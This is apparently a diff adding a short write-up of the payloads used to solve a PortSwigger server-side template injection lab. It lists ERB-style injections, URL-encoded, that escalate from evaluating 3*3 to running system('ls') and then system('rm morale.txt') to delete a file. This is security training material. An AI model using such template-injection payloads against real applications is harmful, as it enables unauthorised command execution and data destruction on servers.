@@ -1,0 +1,23 @@
+The injections in this file were used to solve the following lab:
+https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic
+
+Test whether the <% characters are reflected in the servers response, or if they're being used.
+Payload: <%
+URL Encoded Payload: %3C%25
+Result: Nothing, server attempts to do something with these.
+
+Test whether the server is interpreting the payload. 
+Payload: <%= 3*3 %>
+URL Encoded Payload: %3C%25%3D%203%2A3%20%25%3E
+Result: 9
+
+Check if we can execute commands.
+Payload: <%= system("ls") %>
+URL Encoded Payload: %3C%25%3D%20system%28%22ls%22%29%20%25%3E
+Result: morale.txt true
+
+Delete morale.txt
+Payload: <%= system("rm morale.txt") %>
+URL Encoded Payload: %3C%25%3D%20system%28%22rm%20morale.txt%22%29%20%25%3E
+Result: true
+
